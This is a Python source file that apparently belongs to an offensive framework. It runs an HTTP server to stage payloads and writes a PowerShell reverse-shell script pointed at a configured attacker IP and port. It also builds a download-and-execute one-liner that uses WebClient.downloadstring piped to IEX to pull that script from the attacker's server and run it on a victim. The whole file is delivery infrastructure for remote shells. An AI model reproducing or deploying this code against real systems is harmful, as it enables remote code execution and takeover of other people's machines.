from http.server import BaseHTTPRequestHandler, HTTPServer
from http import HTTPStatus
from enum import Enum, auto
from threading import Thread, Event
import os
import requests
from utils.pwsh_utils import ReverseShell
from utils.print_utils import Printer
from config.config import AppConfig

class ServerStatus(Enum):
    Running = auto()
    Stopped = auto()

class HttpDeliveringServer(BaseHTTPRequestHandler):

    files_to_deliver = {"tmp_routes": {}, "permanent_routes": {}}

    @staticmethod
    def notify_download(route, filename):
        HttpDeliveringServer.files_to_deliver["tmp_routes"][route] = filename

    @staticmethod
    def remove_file(route):
        if route in HttpDeliveringServer.files_to_deliver["tmp_routes"]:
            del HttpDeliveringServer.files_to_deliver["tmp_routes"][route]

    @staticmethod
    def init_permanent_route(routes):
        HttpDeliveringServer.files_to_deliver["permanent_routes"] = routes

    @staticmethod
    def add_permanent_route(routes, file):
        HttpDeliveringServer.files_to_deliver["permanent_routes"][routes] = file

    def do_GET(self):
        filename = None
        self.path = self.path.lstrip("/")
        if self.path in HttpDeliveringServer.files_to_deliver["tmp_routes"]:
            filename = HttpDeliveringServer.files_to_deliver["tmp_routes"].get(self.path)
        else:
            filename = HttpDeliveringServer.files_to_deliver["permanent_routes"].get(self.path)

        if(filename is not None and os.path.isfile(filename)):
            content = b""
            with open(filename, "rb") as file:
                content = file.read()

            self.send_response(HTTPStatus.OK)
            self.end_headers()

            self.wfile.write(content)

        else:
            self.send_response(HTTPStatus.NOT_FOUND)
            self.end_headers()

    def log_message(self, format, request_proto, status_code, *args):
        splited_req = request_proto.split()
        route = request_proto
        if len(splited_req) >= 2:
            route = splited_req[1]

        if int(status_code) == HTTPStatus.OK:
            Printer.cr().dbg(f'File downloaded [green]successfully[/green] from {self.address_string()} -->  [blue]{route}[/blue]')


class HttpServer(Thread):
    """
    Class responsible for building payload and creating route for futur download
    """
    def __init__(self):
        super().__init__(name="HttpServerThread")
        self.host = AppConfig.get("host", "HttpServer")
        self.port = int(AppConfig.get("port", "HttpServer"))
        self.server_status = ServerStatus.Stopped
        self.has_started = Event()

    def __str__(self):
        return f"HttpServer(port={self.port}, status={self.server_status.name})"

    def notify_download(self, route, filename):
        if self.server_status == ServerStatus.Running:
            HttpDeliveringServer.notify_download(route, filename)
        else:
            Printer.err("Http server is not running...")

    def prepare_rev_shell_script(self):
        script_name = AppConfig.get("rev_shell_name", "Script")
        ip_addr = AppConfig.get("default_ip_address")
        route = "route_for_rev_shell.log"
        script_content = ReverseShell(ip_addr, AppConfig.get("listening_port", "Connections")).get_content()
        with open(script_name, 'w') as f:
            f.write(script_content)

        HttpDeliveringServer.add_permanent_route(route, script_name)

        return self.download_link_powershell(route)

    def add_permanent_route(self, route, script_name):
        HttpDeliveringServer.add_permanent_route(route, script_name)

    def download_link_powershell(self, route):
        http_route = self.create_download_link(route)
        return f"""(new-object System.Net.Webclient).downloadstring("{http_route}")|IEX"""

    def create_download_link(self, route):
        ip_addr = AppConfig.get("default_ip_address")
        return f'http://{ip_addr}:{str(self.port)}/{route}'

    def end_download(self, route):
        HttpDeliveringServer.remove_file(route)

    @property
    def is_listening(self):
        return self.server_status == ServerStatus.Running

    def stop_listening(self):
        self.server_status = ServerStatus.Stopped
        try:
            requests.get(f"http://{self.host}:{str(self.port)}", timeout=1)
        except:
            pass

    def run(self):
        try:
            httpd = HTTPServer((self.host, self.port), HttpDeliveringServer)
            self.server_status = ServerStatus.Running

        except Exception as e:
            self.has_started.set()
            Printer.err(e)
            return

        Printer.dbg(f"Http server started on port {self.port}")
        self.has_started.set()
        
        while(self.server_status == ServerStatus.Running):
            httpd.handle_request()
